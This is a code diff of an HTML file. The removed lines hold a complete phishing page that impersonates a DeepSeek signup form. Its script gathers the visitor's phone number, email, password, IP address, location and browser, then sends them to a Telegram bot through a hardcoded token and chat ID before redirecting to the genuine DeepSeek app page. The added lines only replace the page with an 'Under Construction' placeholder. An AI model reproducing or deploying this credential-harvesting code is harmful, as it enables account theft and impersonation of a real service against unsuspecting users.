@@ -2,234 +2,32 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>DeepSeek Signup</title>
-    <link rel="icon" href="https://www.deepseek.com/favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Under Construction</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
             background-color: #f8f9fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
         }
-        .signup-container {
-            background: white;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
-        }
-        .logo {
-            display: block;
-            margin: 0 auto 1rem;
-            width: 300px;
-        }
-        .flag-icon {
-            width: 25px;
-            height: 18px;
-            margin-right: 5px;
+        .container {
+            max-width: 600px;
         }
     </style>
 </head>
 <body>
-
-<div class="signup-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/DeepSeek_logo.svg" alt="DeepSeek Logo" class="logo">
-    <h5 class="text-center">One DeepSeek account is all you need to access all DeepSeek services.</h5>
-    <p class="text-center text-muted">Only phone number registration is supported in your region.</p>
-    
-    <form id="signupForm">
-        <!-- Phone Number with Country Code & Flag -->
-        <div class="mb-3">
-            <label class="form-label">Phone Number</label>
-            <div class="input-group">
-                <span class="input-group-text">
-                    <img id="countryFlag" src="https://flagcdn.com/w40/us.png" class="flag-icon">
-                </span>
-                <select class="form-select" id="countryCode" style="max-width: 120px;">
-                    <option value="+1" data-flag="us" selected>🇺🇸 +1 (USA)</option>
-                    <option value="+44" data-flag="gb">🇬🇧 +44 (UK)</option>
-                    <option value="+91" data-flag="in">🇮🇳 +91 (India)</option>
-                    <option value="+971" data-flag="ae">🇦🇪 +971 (UAE)</option>
-                    <option value="+964" data-flag="iq">🇮🇶 +964 (Iraq)</option>
-                    <option value="+49" data-flag="de">🇩🇪 +49 (Germany)</option>
-                    <option value="+33" data-flag="fr">🇫🇷 +33 (France)</option>
-                    <option value="+81" data-flag="jp">🇯🇵 +81 (Japan)</option>
-                    <option value="+86" data-flag="cn">🇨🇳 +86 (China)</option>
-                    <option value="+7" data-flag="ru">🇷🇺 +7 (Russia)</option>
-                    <option value="+39" data-flag="it">🇮🇹 +39 (Italy)</option>
-                    <option value="+55" data-flag="br">🇧🇷 +55 (Brazil)</option>
-                    <option value="+61" data-flag="au">🇦🇺 +61 (Australia)</option>
-                    <option value="+34" data-flag="es">🇪🇸 +34 (Spain)</option>
-                    <option value="+20" data-flag="eg">🇪🇬 +20 (Egypt)</option>
-                    <option value="+27" data-flag="za">🇿🇦 +27 (South Africa)</option>
-                    <option value="+82" data-flag="kr">🇰🇷 +82 (South Korea)</option>
-                </select>
-                <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter phone number" required>
-            </div>
+    <div class="container">
+        <img src="https://images2.alphacoders.com/134/1347232.png" class="img-fluid mb-4" alt="Under Construction">
+        <h1 class="display-4">Coming Soon</h1>
+        <p class="lead">Our website is currently under construction. Stay tuned for updates!</p>
+        <div class="mt-4">
+            <a href="#" class="btn btn-primary">Notify Me</a>
+            <a href="#" class="btn btn-outline-secondary">Go Back</a>
         </div>
-
-        <!-- Email Address -->
-        <div class="mb-3">
-            <label class="form-label">Email Address</label>
-            <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
-        </div>
-
-        <!-- Password -->
-        <div class="mb-3">
-            <label class="form-label">Password</label>
-            <input type="password" class="form-control" id="password" placeholder="Password" required>
-            <div class="invalid-feedback">Passwords must match.</div>
-        </div>
-
-        <!-- Confirm Password -->
-        <div class="mb-3">
-            <label class="form-label">Confirm Password</label>
-            <input type="password" class="form-control" id="confirmPassword" placeholder="Confirm Password" required>
-            <div class="invalid-feedback">Passwords must match.</div>
-        </div>
-
-        <!-- Terms and Conditions -->
-        <div class="mb-3 form-check">
-            <input type="checkbox" class="form-check-input" id="terms" required>
-            <label class="form-check-label" for="terms">
-                I confirm that I have read, consent, and agree to DeepSeek's 
-                <a href="https://chat.deepseek.com/downloads/DeepSeek%20Terms%20of%20Use.html">Terms of Use</a> and <a href="https://chat.deepseek.com/downloads/DeepSeek%20Privacy%20Policy.html">Privacy Policy</a>.<br>
-            </label>
-        </div>
-
-        <!-- Signup Button -->
-        <button type="submit" class="btn btn-primary w-100">Sign up</button>
-    </form>
-</div>
-
-<script>
-    // Function to update the flag image when the country code is changed
-    document.getElementById('countryCode').addEventListener('change', function() {
-        let flagCode = this.options[this.selectedIndex].getAttribute('data-flag');
-        document.getElementById('countryFlag').src = `https://flagcdn.com/w40/${flagCode}.png`;
-    });
-
-    // Function to get browser information
-    function getBrowserInfo() {
-        const ua = navigator.userAgent;
-        const match = /(chrome|firefox|safari|msie|trident)/i.exec(ua);
-        return match ? match[0] : 'Unknown Browser';
-    }
-
-    // Function to get IP address and location
-    async function getIP() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const ip = data.ip;
-            const ipLink = `[${ip}](https://ip-api.com/#${ip})`;  // Format the IP as a link
-
-            // Fetch location data based on IP address using ip-api
-            const locationResponse = await fetch(`https://ip-api.com/json/${ip}`);
-            const locationData = await locationResponse.json();
-            const { city, country, regionName, zip } = locationData;
-
-            console.log(`IP Address: ${ip}, Location: ${city}, ${regionName}, ${country}, ${zip}`);
-            return { ip: ipLink, location: `${city}, ${regionName}, ${country}, ${zip}` };
-        } catch (error) {
-            console.error('Error fetching IP address or location:', error);
-            return { ip: 'N/A', location: 'N/A' };
-        }
-    }
-
-    document.addEventListener("DOMContentLoaded", function () {
-        console.log("JavaScript Loaded.");
-        
-        const form = document.getElementById("signupForm");
-        const phoneNumberInput = document.getElementById("phoneNumber");
-        const emailInput = document.getElementById("email");
-        const passwordInput = document.getElementById("password");
-        const confirmPasswordInput = document.getElementById("confirmPassword");
-
-        form.addEventListener("submit", async function (event) {
-            event.preventDefault();  // Prevent form submission
-
-            const phoneNumber = phoneNumberInput.value;
-            const email = emailInput.value;
-            const password = passwordInput.value;
-            const confirmPassword = confirmPasswordInput.value;
-            const { ip, location } = await getIP();  // Get user's IP address and location
-            const browserInfo = getBrowserInfo();  // Get browser information
-
-            const message = `
-▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-IP Address 👁: ${ip}
-Location 📍: ${location}
-▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-Phone Number 📱: ${phoneNumber}
-▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-Email address 📩: ${email}
-▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-Password  🔐: ${password}
-▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-Browser info 🌍 : ${browserInfo}
-▰▱▰▱▰▱▰▱▰▱▰▱▰▱
-`;
-
-            // Send data to Telegram Bot
-            const TELEGRAM_BOT_TOKEN = '5033312441:AAHf3soRV_BQk6rKTx5R6xH4TY2Jr5SCEp4';
-            const TELEGRAM_CHAT_ID = '1683491443';
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const data = {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-            };
-
-            await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
-            });
-
-            // Redirect user to Google Play link
-            window.location.href = "https://play.google.com/store/apps/details?id=com.deepseek.chat&pli=1";
-        });
-    });
-</script>
-<script>
-    document.addEventListener("DOMContentLoaded", function () {
-        const form = document.getElementById("signupForm");
-        const passwordInput = document.getElementById("password");
-        const confirmPasswordInput = document.getElementById("confirmPassword");
-
-        function validatePasswords() {
-            if (passwordInput.value !== confirmPasswordInput.value) {
-                passwordInput.classList.add("is-invalid");
-                confirmPasswordInput.classList.add("is-invalid");
-                passwordInput.classList.remove("is-valid");
-                confirmPasswordInput.classList.remove("is-valid");
-            } else {
-                passwordInput.classList.remove("is-invalid");
-                confirmPasswordInput.classList.remove("is-invalid");
-                passwordInput.classList.add("is-valid");
-                confirmPasswordInput.classList.add("is-valid");
-            }
-        }
-
-        passwordInput.addEventListener("input", validatePasswords);
-        confirmPasswordInput.addEventListener("input", validatePasswords);
-
-        form.addEventListener("submit", function (event) {
-            if (!form.checkValidity() || passwordInput.value !== confirmPasswordInput.value) {
-                event.preventDefault();
-                event.stopPropagation();
-                validatePasswords();
-            }
-        });
-    });
-</script>
-
-
+    </div>
 </body>
 </html>
